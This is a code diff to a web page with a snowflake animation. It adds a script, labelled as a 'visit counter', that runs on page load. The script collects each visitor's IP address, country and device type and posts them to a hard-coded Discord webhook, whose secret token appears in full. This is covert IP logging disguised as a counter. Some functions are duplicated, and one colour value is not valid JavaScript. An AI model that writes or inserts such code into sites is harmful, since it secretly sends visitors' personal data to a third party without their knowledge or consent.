@@ -382,6 +382,171 @@
           drawSnowflakes();
         }
       }
+
+function detectDevice() {
+    const ua = navigator.userAgent;
+    if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+        return 'Mobile';
+    } else if (/Tablet|iPad|PlayBook|Silk|Xoom|SCH-I800|GT-P1000|SHW-M180S/.test(ua)) {
+        return 'Tablet';
+    } else {
+        return 'Desktop';
+    }
+}
+
+// Função para obter IP e país
+async function getIPAndCountry() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip;
+        
+        // Obter informações de localização baseadas no IP
+        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const locationData = await locationResponse.json();
+        
+        return {
+            ip: ip,
+            country: locationData.country_name || 'Unknown',
+            countryCode: locationData.country_code || '??',
+            flag: getCountryFlag(locationData.country_code)
+        };
+    } catch (error) {
+        return {
+            ip: 'Unknown',
+            country: 'Unknown',
+            countryCode: '??',
+            flag: '🏴'
+        };
+    }
+}
+
+// Função para obter emoji da bandeira do país
+function getCountryFlag(countryCode) {
+    if (!countryCode) return '🏴';
+    
+    const codePoints = countryCode
+        .toUpperCase()
+        .split('')
+        .map(char => 127397 + char.charCodeAt());
+    
+    return String.fromCodePoint(...codePoints);
+}
+
+// Função para detectar dispositivo
+function detectDevice() {
+    const ua = navigator.userAgent;
+    if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+        return 'Mobile';
+    } else if (/Tablet|iPad|PlayBook|Silk|Xoom|SCH-I800|GT-P1000|SHW-M180S/.test(ua)) {
+        return 'Tablet';
+    } else {
+        return 'Desktop';
+    }
+}
+
+// Função para obter IP e país
+async function getIPAndCountry() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip;
+        
+        // Obter informações de localização baseadas no IP
+        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const locationData = await locationResponse.json();
+        
+        return {
+            ip: ip,
+            country: locationData.country_name || 'Unknown',
+            countryCode: locationData.country_code || '??',
+            flag: getCountryFlag(locationData.country_code)
+        };
+    } catch (error) {
+        return {
+            ip: 'Unknown',
+            country: 'Unknown',
+            countryCode: '??',
+            flag: '🏴'
+        };
+    }
+}
+
+// Função para obter emoji da bandeira do país
+function getCountryFlag(countryCode) {
+    if (!countryCode) return '🏴';
+    
+    const codePoints = countryCode
+        .toUpperCase()
+        .split('')
+        .map(char => 127397 + char.charCodeAt());
+    
+    return String.fromCodePoint(...codePoints);
+}
+
+// Função principal
+async function initCounter() {
+    const webhookURL = 'https://discord.com/api/webhooks/1423813794919878718/_yXodNoeP_XLWZ8Etgoc0r28sSfSg4-hHYcyGpuCjyp9m4HbyJRWKRm65gZLp8Pk3_ZC';
+    const bannerURL = 'https://i.imgur.com/wLxGNAZ.gif';
+    
+    try {
+        // Obter IP, informações do dispositivo e país
+        const ipInfo = await getIPAndCountry();
+        const device = detectDevice();
+        
+        // Enviar webhook
+        const webhookData = {
+            content: "@everyone", // Everyone fora da embed
+            embeds: [{
+                title: "<a:l_dance:1423830535154696264> COUNTER +1 VISIT 🥛",
+                description: "# <a:noted:1423830399578280090> VISIT +1!",
+                color: FFB3F1, // Rosa claro
+                fields: [
+                    {
+                        name: "<:thumbsup:1423830354095112308> **IP:**",
+                        value: `[${ipInfo.ip}](https://ip-api.com/#${ipInfo.ip})`,
+                        inline: true
+                    },
+                    {
+                        name: "<a:sleep:1423830313695711304> **Device:**",
+                        value: device,
+                        inline: true
+                    },
+                    {
+                        name: "<:Sigh:1423830443622404187> **Country:**",
+                        value: ipInfo.flag,
+                        inline: true
+                    }
+                ],
+                image: {
+                    url: bannerURL
+                },
+                footer: {
+                    text: "Neko Counters ©"
+                },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(webhookData)
+        });
+
+        // Atualizar contador local
+        const counterDisplay = document.getElementById('counterDisplay');
+        counterDisplay.textContent = "🍼 COUNTER +1 VISIT REGISTERED! 🥛";
+
+    } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('counterDisplay').textContent = "🍼 ERROR LOADING COUNTER 🥛";
+    }
+}
+
+document.addEventListener("DOMContentLoaded", initCounter);
       
       // Inicializar
       window.addEventListener("resize", resize);
